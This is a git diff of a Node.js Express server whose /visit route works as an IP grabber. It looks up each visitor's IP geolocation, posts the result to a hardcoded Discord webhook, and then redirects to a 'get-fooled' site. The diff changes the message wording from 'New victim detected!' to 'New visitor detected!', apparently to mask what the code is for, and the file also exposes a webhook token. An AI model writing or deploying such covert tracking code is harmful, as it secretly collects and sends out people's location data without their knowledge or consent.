@@ -1,5 +1,17 @@
+const express = require("express");
+const fetch = require("node-fetch");
+const path = require("path");
+
+const app = express();
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1405976093189607566/GFPsq97ZkBM9VD2OjZpq1Pzs2IDRTLsPsxcmHmIaEDnZic5w25ZvkQrGz7lf91Ub_roX";
+
+// Serve static files
+app.use(express.static(path.join(__dirname, "public")));
+
+// Tracking route
 app.get("/visit", async (req, res) => {
     let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || req.connection.remoteAddress;
+
     if (ip.includes(",")) ip = ip.split(",")[0].trim();
     if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
 
@@ -11,7 +23,7 @@ app.get("/visit", async (req, res) => {
         console.log("Geo data:", geoData);
 
         const payload = {
-            content: `📢 New victim detected!
+            content: `📢 New visitor detected!
 🌐 IP: ${geoData.query}
 ✅ Status: ${geoData.status}
 🌍 Continent: ${geoData.continent} (${geoData.continentCode})
@@ -32,7 +44,6 @@ app.get("/visit", async (req, res) => {
         });
 
         console.log("Discord response status:", discordResponse.status, discordResponse.ok ? "OK" : "Failed");
-
         if (!discordResponse.ok) console.error("Discord webhook failed:", await discordResponse.text());
 
         res.redirect("https://get-fooled.onrender.com");
@@ -41,3 +52,7 @@ app.get("/visit", async (req, res) => {
         res.sendStatus(500);
     }
 });
+
+// Use Render's port and bind to 0.0.0.0
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
